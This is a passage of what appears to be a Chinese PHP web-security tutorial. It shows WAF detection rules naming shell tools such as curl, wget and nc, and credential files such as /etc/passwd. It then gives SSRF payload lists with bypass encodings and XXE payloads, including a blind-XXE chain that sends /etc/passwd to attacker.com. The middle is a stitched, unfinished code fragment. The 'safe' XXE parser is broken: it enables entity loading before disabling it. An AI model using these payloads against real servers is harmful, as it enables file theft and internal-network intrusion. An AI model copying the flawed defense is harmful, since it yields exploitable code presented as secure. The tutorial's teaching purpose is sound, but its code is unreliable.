                // SVG XSS
                '/<svg/i' => 'SVG XSS',
                // 表达式
                '/expression\s*\(/i' => 'CSS expression XSS',
            ],

            // ===== 路径遍历规则 =====
            'lfi' => [
                '/\.\.\//i' => '目录遍历 (../)',
                '/\.\.\\\\/i' => '目录遍历 (..\\)',
                '/\/etc\/passwd/i' => '读取 /etc/passwd',
                '/\/proc\/self\/environ/i' => '读取环境变量',
                '/php:\/\/(filter|input|memory|temp)/i' => 'PHP 伪协议',
                '/php:\/\/filter.*resource/i' => 'PHP filter 读取',
                '/data:\/\/text\/plain/i' => 'Data 协议包含',
                '/phar:\/\//i' => 'Phar 协议',
            ],

            // ===== 命令注入规则 =====
            'rce' => [
                '/[;&|`$(){}]/' => 'Shell 元字符',
                '/\b(cat|ls|id|whoami|uname|wget|curl|nc|bash|sh)\b/i' => '系统命令',
                '/\$\(|`/' => '命令替换',
                '/\|\s*\w+/' => '管道命令',
                '/\b(eval|assert|system|exec|passthru)\s*\(/i' => 'PHP 执行函数',
            ],

            // ===== XXE 规则 =====
            'xxe' => [
                '/<!ENTITY/i' => 'XML 实体声明',
                '/<!DOCTYPE.*\[/i' => 'DTD 声明',
                '/SYSTEM\s+["\']/i' => '外部实体引用',
            ],

            // ===== SSRF 规则 =====
            'ssrf' => [
                '/\b(127\.0\.0\.1|localhost|0\.0\.0\.0|::1)\b/i' => '内网地址',
                '/\b(169\.254\.169\.254)\b/i' => '云元数据地址',
                '/\b(10\.\d+|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d+\.\d+/i' => '私有 IP 地址',
            ],
        ];
    }

    /**
     * 扫描输入数据
     */
    public function scan(string $input): array {
        $findings = [];

        foreach ($this->rules as $category => $patterns) {
            foreach ($patterns as $pattern => $description) {
                if (preg_match($pattern, $input)) {
                    $findings[] = [
                        'category' => $category,
                        'description' => $description,
                        'pattern' => $pattern,
                        'input_snippet' => substr($input, 0, 100),
                    ];
                }
            }
        }

        return $findings;
    }

    /**
     * 处理请求
     */
    public function processRequest(): bool {
        // 收集所有输入
        $inputs = [
            'GET' => $_GET,
            'POST' => $_POST,
            'COOKIE' => $_COOKIE,
            'SERVER' => [
                'HTTP_USER_AGENT' => $_SERVER['HTTP_USER_AGENT'] ?? '',
                'HTTP_REFERER' => $_SERVER['HTTP_REFERER'] ?? '',
                'QUERY_STRING' => $_SERVER['QUERY_STRING'] ?? '',
                'REQUEST_URI' => $_SERVER['REQUEST_URI'] ?? '',
            ],
        ];

        $allFindings = [];
        $blocked = false;

        foreach ($inputs as $source => $data) {
            foreach ($data as $key => $value) {
                if (!is_string($value)) continue;

                $findings = $this->scan($value);
                if (!empty($findings)) {
                    $allFindings[] = [
                        'source' => $source,
                        'param' => $key,
                        'findings' => $findings,
                    ];

                    // 高危类别直接拦截
                    $highRisk = ['sqli', 'xss', 'rce', 'lfi'];
                    foreach ($findings as $f) {
                        if (in_array($f['category'], $highRisk)) {
                            $blocked = true;
                        }
                    }
                }
            }
        }

        // 检查原始 POST 体
        $rawBody = file_get_contents('php://input');
        if ($rawBody) {
            $findings = $this->scan($rawBody);
            if (!empty($findings)) {
                $allFindings[] = [
                    'source' => 'RAW_BODY',
                    'param' => 'php://input',
                    'findings' => $findings,
                ];
                $blocked = true;
            }
        }

        // 记录日志
        if (!empty($allFindings)) {
            $this->logFindings($allFindings);
        }

        // 拦截请求
        if ($blocked) {
            $this->blockRequest($allFindings);
            return false;
        }

        return true;
    }

    /**
     * 记录发现
     */
    private function logFindings(array $findings): void {
        $logEntry = sprintf(
            "[%s] WAF Alert | IP: %s | URI: %s | Findings: %s\n",
            date('Y-m-d H:i:s'),
            $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            $_SERVER['REQUEST_URI'] ?? '',
            json_encode($findings, JSON_UNESCAPED_UNICODE)
        );

        file_put_contents($this->logFile, $logEntry, FILE_APPEND | LOCK_EX);
    }

    /**
     * 拦截请求
     */
    private function blockRequest(array $findings): void {
        http_response_code(403);
        header('Content-Type: application/json');

        echo json_encode([
            'error' => '请求被 WAF 拦截',
            'message' => '检测到恶意输入，请求已被拒绝',
            'request_id' => bin2hex(random_bytes(16)),
            // 生产环境不返回详细检测信息
        ], JSON_UNESCAPED_UNICODE);

        // 记录被拦截的请求详情
        error_log(sprintf(
            "WAF BLOCK | IP: %s | URI: %s | Method: %s | Findings: %s",
            $_SERVER['REMOTE_ADDR'] ?? '',
            $_SERVER['REQUEST_URI'] ?? '',
            $_SERVER['REQUEST_METHOD'] ?? '',
            json_encode($findings, JSON_UNESCAPED_UNICODE)
        ));

        exit;
    }

    /**
     * 获取客户端 IP（考虑代理）
     */
    private function getClientIP(): string {
        $headers = [
            'HTTP_X_FORWARDED_FOR',
```

```php
        '127.0.0.0/8',
        '169.254.0.0/16',  // 链路本地
        '0.0.0.0/8',
    ];

    foreach ($privateRanges as $range) {

    }

    // 5. 使用 cURL 并禁用重定向

function ipInCidr(string $ip, string $cidr): bool {
    [$subnet, $mask] = explode('/', $cidr);

    $maskLong = -1 << (32 - (int)$mask);
```

### 4.3 SSRF 与 XXE 攻击

服务器端请求伪造和 XML 外部实体注入的 PHP 利用。

```php
<?php
// ===== SSRF 攻击 =====

// SSRF 常见场景
function ssrf_vulnerable($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

// SSRF 利用方式
$ssrf_payloads = [
    // 探测内网
    'http://127.0.0.1:22/',
    'http://127.0.0.1:6379/',
    'http://192.168.1.1/',
    'http://10.0.0.1:8080/',
    
    // file 协议（读本地文件）
    'file:///etc/passwd',
    'file:///C:/windows/win.ini',
    
    // gopher 协议（攻击内网服务）
    'gopher://127.0.0.1:6379/_INFO',
    
    // dict 协议
    'dict://127.0.0.1:6379/INFO',
    
    // 绕过技巧
    'http://0x7f000001/',       // 十六进制
    'http://2130706433/',       // 十进制
    'http://017700000001/',     // 八进制
    'http://127.1/',            // 简写
    'http://0.0.0.0:22/',       // 0.0.0.0
    'http://localhost:22/',     // localhost
];

// ===== XXE 攻击 =====

function xxe_vulnerable($xmlData) {
    $dom = new DOMDocument();
    $dom->loadXML($xmlData);  // 漏洞点：禁用外部实体
    return $dom;
}

// XXE Payload
$xxe_payload = <<<XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
XML;

// XXE 高级：外部 DTD
$xxe_external = <<<XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
<foo>&xxe;</foo>
XML;

// evil.dtd 内容：
// <!ENTITY % file SYSTEM "file:///etc/passwd">
// <!ENTITY % eval "<!ENTITY xxe SYSTEM 'http://attacker.com/?data=%file;'>">
// %eval;

// Blind XXE（无回显时带外数据）
$blind_xxe = <<<XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<foo>test</foo>
XML;

// XXE 防护
function safe_xml_parse($xmlData) {
    $dom = new DOMDocument();
    $dom->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);  // 不安全！
    // 安全的方式：禁用外部实体
    libxml_disable_entity_loader(true);  // PHP 8.0+ 默认禁用
    return $dom;
}
?>
```
